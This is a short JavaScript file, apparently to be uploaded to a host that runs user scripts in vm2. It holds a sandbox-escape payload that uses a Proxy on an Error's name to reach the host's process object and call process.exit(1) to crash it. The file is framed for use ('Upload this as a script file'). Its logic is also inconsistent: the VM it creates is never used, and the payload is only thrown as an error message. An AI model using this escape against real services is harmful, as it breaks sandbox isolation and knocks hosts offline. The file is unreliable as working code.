// Upload this as a script file
const { VM } = require('vm2');
const vm = new VM();

// Known sandbox escape (simplified example)
const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        process.exit(1); // CRASH
      }
    })
  };
  try { err.stack; } catch(e) {}
`;

module.exports = async () => {
  throw new Error(code);
};